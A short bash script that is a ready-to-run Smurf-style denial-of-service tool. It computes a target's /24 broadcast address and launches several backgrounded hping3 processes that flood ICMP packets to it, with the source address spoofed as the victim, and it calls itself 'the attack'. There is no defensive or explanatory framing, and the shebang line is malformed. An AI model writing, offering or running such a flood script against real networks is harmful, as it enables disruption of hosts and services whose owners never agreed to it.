#!bin/bash

RED='\033[0;31m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
NC='\033[0m'

target=$1
threads=$2
port=$3
broadcast=$(ipcalc -b "$target"/24 | grep 'Broadcast' | awk '{print $2}')

for i in $(seq 1 $threads); do
        hping3 -1 -a $target $broadcast --flood -p $port > /dev/null 2>&1 &
	echo -e "${YELLOW}[+]${MAGENTA} Thread $i started${NC}"

done

echo -e  "\n${MAGENTA}To stop the attack press,${YELLOW} CTRL + C${NC}"

wait
